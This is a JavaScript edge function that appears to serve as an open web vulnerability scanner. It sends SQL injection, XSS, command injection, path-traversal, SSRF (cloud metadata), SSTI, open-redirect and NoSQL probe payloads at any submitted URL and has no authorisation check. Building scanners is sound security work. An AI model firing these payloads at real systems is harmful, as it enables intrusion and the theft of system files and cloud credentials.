// SQL Injection payloads
const SQL_PAYLOADS = [
  "' OR '1'='1",
  "' OR '1'='1' --",
  "' OR '1'='1' /*",
  "1' OR '1'='1",
  "' UNION SELECT NULL--",
];

// XSS payloads
const XSS_PAYLOADS = [
  "<script>alert('XSS')</script>",
  "<img src=x onerror=alert('XSS')>",
  "<svg onload=alert('XSS')>",
  "javascript:alert('XSS')",
  "'><script>alert('XSS')</script>",
];

// Command Injection payloads
const CMD_PAYLOADS = [
  "; ls -la",
  "| ls -la",
  "; cat /etc/passwd",
  "| whoami",
  "&& whoami"
];

// Path Traversal payloads
const PATH_PAYLOADS = [
  "../../../etc/passwd",
  "....//....//....//etc/passwd",
  "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
  "/etc/passwd",
];

// SSRF payloads
const SSRF_PAYLOADS = [
  "http://localhost",
  "http://127.0.0.1",
  "http://169.254.169.254/latest/meta-data/",
  "http://metadata.google.internal/",
];

// SSTI payloads
const SSTI_PAYLOADS = [
  "{{7*7}}",
  "${7*7}",
  "<%= 7*7 %>",
  "#{7*7}",
];

// Open Redirect payloads
const OPEN_REDIRECT_PAYLOADS = [
  "//evil.com",
  "https://evil.com",
  "/\\evil.com",
  "////evil.com",
];

// NoSQL Injection payloads
const NOSQL_PAYLOADS = [
  '{"$gt": ""}',
  '{"$ne": null}',
  '{"$ne": ""}',
];

// Signatures
const SQL_ERROR_SIGNATURES = ['sql syntax', 'mysql', 'sqlite', 'postgresql', 'ORA-', 'SQL Server', 'ODBC', 'syntax error', 'query failed', 'database error'];
const XSS_REFLECTION_PATTERNS = [/<script[^>]*>alert\(/i, /onerror\s*=\s*alert\(/i, /onload\s*=\s*alert\(/i];
const CMD_INJECTION_SIGNATURES = ['root:x:0:0', '/bin/bash', '/bin/sh', 'uid=', 'gid=', 'drwx', '-rw-'];
const PATH_TRAVERSAL_SIGNATURES = ['root:x:0:0', 'daemon:x:', '/bin/bash', '/bin/sh'];
const SSRF_SIGNATURES = ['ami-id', 'instance-id', 'metadata', 'localhost', '127.0.0.1'];
const SSTI_SIGNATURES = ['49', '__class__', '__mro__', 'config'];
const NOSQL_SIGNATURES = ['MongoError', 'CastError', 'ValidationError', 'BSONTypeError'];

async function makeRequest(url, method = 'GET', payload = null, customHeaders = {}) {
  const controller = new AbortController();
  const timeout = setTimeout(() => controller.abort(), 10000);

  try {
    const options = {
      method,
      signal: controller.signal,
      headers: {
        'User-Agent': 'AEGIS-Security-Scanner/1.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        ...customHeaders
      },
      redirect: 'manual'
    };

    if (method === 'POST' && payload) {
      options.headers['Content-Type'] = 'application/x-www-form-urlencoded';
      options.body = payload;
    }

    const response = await fetch(url, options);
    const text = await response.text();

    return {
      statusCode: response.status,
      headers: Object.fromEntries(response.headers.entries()),
      body: text,
    };
  } finally {
    clearTimeout(timeout);
  }
}

function injectPayloadIntoUrl(baseUrl, payload) {
  const url = new URL(baseUrl);
  const injectedUrls = [];
  const testParams = ['id', 'q', 'search', 'url', 'redirect', 'file', 'path', 'page'];
  
  for (const [key] of url.searchParams) {
    const newUrl = new URL(baseUrl);
    newUrl.searchParams.set(key, payload);
    injectedUrls.push({ url: newUrl.toString(), param: key });
  }
  
  for (const param of testParams) {
    const testUrl = new URL(baseUrl);
    testUrl.searchParams.set(param, payload);
    injectedUrls.push({ url: testUrl.toString(), param });
  }
  
  return injectedUrls;
}

function checkVulnerability(vulnType, response, payload) {
  const body = response.body.toLowerCase();
  
  switch (vulnType) {
    case 'SQL Injection':
      for (const sig of SQL_ERROR_SIGNATURES) {
        if (body.includes(sig.toLowerCase())) return { found: true, evidence: sig, type: 'SQL Error' };
      }
      break;
    case 'XSS (Cross-Site Scripting)':
      if (response.body.includes(payload)) return { found: true, evidence: 'Payload reflected', type: 'Reflected XSS' };
      for (const pattern of XSS_REFLECTION_PATTERNS) {
        if (pattern.test(response.body)) return { found: true, evidence: 'XSS pattern detected', type: 'Reflected XSS' };
      }
      break;
    case 'Command Injection':
      for (const sig of CMD_INJECTION_SIGNATURES) {
        if (response.body.includes(sig)) return { found: true, evidence: sig, type: 'Command Output' };
      }
      break;
    case 'Path Traversal':
      for (const sig of PATH_TRAVERSAL_SIGNATURES) {
        if (response.body.includes(sig)) return { found: true, evidence: sig, type: 'File Content' };
      }
      break;
    case 'SSRF (Server-Side Request Forgery)':
      for (const sig of SSRF_SIGNATURES) {
        if (body.includes(sig.toLowerCase())) return { found: true, evidence: sig, type: 'Internal Access' };
      }
      break;
    case 'SSTI (Server-Side Template Injection)':
      if (payload.includes('7*7') && response.body.includes('49')) return { found: true, evidence: '49', type: 'Template Evaluated' };
      for (const sig of SSTI_SIGNATURES) {
        if (response.body.includes(sig)) return { found: true, evidence: sig, type: 'Template Exposed' };
      }
      break;
    case 'Open Redirect':
      if ([301, 302, 303, 307, 308].includes(response.statusCode)) {
        const location = response.headers['location'] || '';
        if (location.includes('evil.com')) return { found: true, evidence: location, type: 'Open Redirect' };
      }
      break;
    case 'NoSQL Injection':
      for (const sig of NOSQL_SIGNATURES) {
        if (response.body.includes(sig)) return { found: true, evidence: sig, type: 'NoSQL Error' };
      }
      break;
  }
  return { found: false };
}

function getPayloads(vulnType) {
  const map = {
    'SQL Injection': SQL_PAYLOADS,
    'XSS (Cross-Site Scripting)': XSS_PAYLOADS,
    'Command Injection': CMD_PAYLOADS,
    'Path Traversal': PATH_PAYLOADS,
    'SSRF (Server-Side Request Forgery)': SSRF_PAYLOADS,
    'SSTI (Server-Side Template Injection)': SSTI_PAYLOADS,
    'Open Redirect': OPEN_REDIRECT_PAYLOADS,
    'NoSQL Injection': NOSQL_PAYLOADS,
  };
  return map[vulnType] || [vulnType];
}

function getSeverity(vulnType) {
  const map = {
    'SQL Injection': 'Critical',
    'XSS (Cross-Site Scripting)': 'High',
    'Command Injection': 'Critical',
    'Path Traversal': 'High',
    'SSRF (Server-Side Request Forgery)': 'Critical',
    'SSTI (Server-Side Template Injection)': 'Critical',
    'Open Redirect': 'Medium',
    'NoSQL Injection': 'Critical',
  };
  return map[vulnType] || 'Medium';
}

export const config = {
  runtime: 'edge',
};

export default async function handler(request) {
  // Handle CORS
  if (request.method === 'OPTIONS') {
    return new Response(null, {
      headers: {
        'Access-Control-Allow-Origin': '*',
        'Access-Control-Allow-Methods': 'POST, OPTIONS',
        'Access-Control-Allow-Headers': 'Content-Type',
      },
    });
  }

  if (request.method !== 'POST') {
    return new Response(JSON.stringify({ error: 'Method not allowed' }), {
      status: 405,
      headers: { 'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*' },
    });
  }

  try {
    const { targetUrl, vulnType, payload } = await request.json();

    if (!targetUrl) {
      return new Response(JSON.stringify({ error: 'Target URL required' }), {
        status: 400,
        headers: { 'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*' },
      });
    }

    const results = {
      vulnerability_found: false,
      severity: 'Low',
      findings: [],
      rawResponses: [],
      testedPayloads: [],
      analysis: '',
      fix_suggestion: ''
    };

    const payloads = getPayloads(vulnType).slice(0, 3);

    // Baseline request
    let baseline;
    try {
      baseline = await makeRequest(targetUrl);
    } catch (e) {
      results.analysis = `Could not reach target: ${e.message}`;
      return new Response(JSON.stringify(results), {
        headers: { 'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*' },
      });
    }

    // Test payloads
    for (const testPayload of payloads) {
      results.testedPayloads.push(testPayload);
      const injectedUrls = injectPayloadIntoUrl(targetUrl, testPayload);

      for (const injection of injectedUrls.slice(0, 3)) {
        try {
          const response = await makeRequest(injection.url);
          
          results.rawResponses.push({
            payload: testPayload,
            param: injection.param,
            statusCode: response.statusCode,
            bodyLength: response.body.length,
            snippet: response.body.substring(0, 500)
          });

          const check = checkVulnerability(vulnType, response, testPayload);
          
          if (check.found) {
            results.vulnerability_found = true;
            results.severity = getSeverity(vulnType);
            results.findings.push({
              payload: testPayload,
              parameter: injection.param,
              evidence: check.evidence,
              type: check.type,
              statusCode: response.statusCode
            });
            results.analysis = `VULNERABILITY CONFIRMED: ${vulnType}\n\nTarget: ${targetUrl}\nPayload: ${testPayload}\nEvidence: ${check.evidence}`;
            results.fix_suggestion = `Implement proper input validation and output encoding for ${vulnType} prevention.`;
            
            return new Response(JSON.stringify(results), {
              headers: { 'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*' },
            });
          }
        } catch (e) {
          // Continue on error
        }
      }
    }

    results.analysis = `SCAN COMPLETE: No ${vulnType} vulnerability detected.\n\nTarget: ${targetUrl}\nPayloads Tested: ${payloads.length}`;
    results.fix_suggestion = 'Continue following security best practices.';

    return new Response(JSON.stringify(results), {
      headers: { 'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*' },
    });

  } catch (error) {
    return new Response(JSON.stringify({ error: error.message }), {
      status: 500,
      headers: { 'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*' },
    });
  }
}
